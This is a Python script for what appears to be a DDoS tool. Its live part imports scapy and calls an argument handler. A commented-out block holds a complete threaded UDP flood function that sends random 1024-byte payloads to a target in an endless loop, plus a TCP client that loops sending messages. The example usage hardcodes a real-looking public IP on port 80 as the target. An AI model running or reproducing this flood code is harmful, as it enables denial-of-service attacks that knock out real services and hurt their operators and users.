#!/usr/bin/env python
from src.header import Header
from src.argument_handler import *
from src.helpers import *
from scapy.all import IP, TCP, send
import threading
import socket


if __name__ == "__main__":
    clear_terminal()
    header = Header()
    ArgumentHandler()

# import socket
# import random
# import threading
# import time

# def udp_ddos_attack(target_ip, target_port, num_threads):
#     """
#     Simulates a UDP-based DDoS attack on a given IP and port.
    
#     Parameters:
#     target_ip (str): Target IP address.
#     target_port (int): Target port number.
#     num_threads (int): Number of threads to simulate the attack.
#     """
#     def attack():
#         try:
#             # Create a UDP socket
#             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#             # Generate a random payload
#             payload = random._urandom(1024)  # 1024-byte payload
#             while True:
#                 # Send the payload repeatedly to the target
#                 s.sendto(payload, (target_ip, target_port))
#                 print(f"Packet sent to {target_ip}:{target_port}")
#         except OSError as exc:
#             if exc.errno == 55:
#                 time.sleep(0.1)
#             else:
#                 raise

#     # Start threads to simulate concurrent attack
#     for i in range(num_threads):
#         thread = threading.Thread(target=attack)
#         thread.start()
#         print(f"Thread-{i+1} started.")

# def run_client(target_ip, target_port):
#     # create a socket object
#     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#     server_ip = "127.0.0.1"  # replace with the server's IP address
#     server_port = 8000  # replace with the server's port number
#     # establish connection with server
#     client.connect((target_ip, target_port))

#     while True:
#         # input message and send it to the server
#         msg = "Hello World Umsida"
#         client.send(msg.encode("utf-8")[:1024])

#         # receive message from the server
#         response = client.recv(1024)
#         response = response.decode("utf-8")

#         # if server sent us "closed" in the payload, we break out of the loop and close our socket
#         if response.lower() == "closed":
#             break

#         print(f"Received: {response}")

#     # close client socket (connection to the server)
#     client.close()
#     print("Connection to server closed")

# # Example usage:
# if __name__ == "__main__":
#     target_ip = "103.139.25.68"  # Replace with the target IP
#     target_port = 80  # Replace with the target port (e.g., 80 for HTTP)
#     num_threads = 10  # Number of threads for the attack
#     # udp_ddos_attack(target_ip, target_port, num_threads)
#     run_client(target_ip=target_ip, target_port=target_port)